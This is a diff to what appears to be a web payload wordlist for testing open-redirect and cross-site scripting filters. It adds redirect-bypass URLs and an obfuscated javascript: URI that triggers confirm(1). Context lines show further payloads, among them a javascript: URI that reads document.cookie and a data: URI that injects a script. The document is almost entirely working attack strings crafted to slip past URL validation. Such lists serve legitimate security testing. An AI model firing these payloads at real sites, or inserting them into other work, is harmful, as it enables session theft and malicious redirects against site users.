@@ -267,6 +267,8 @@ javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
 /google.com/%2f%2e%2e
 /http:/google.com
 /.google.com
+http://.google.com
+.google.com
 ///\;@google.com
 ///google.com
 /////google.com/
@@ -277,4 +279,5 @@ java%0dscript:alert(1)
 javascript://%0aalert(1)
 data:www.whitelisteddomain.tld;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
 jaVAscript://www.whitelisteddomain.tld//%0d%0aalert(1);//
-http://www.google.com\.www.whitelisteddomain.tld 
+http://www.google.com\.www.whitelisteddomain.tld
+%19Jav%09asc%09ript:https%20://www.whitelisteddomain.tld/%250Aconfirm%25281%2529
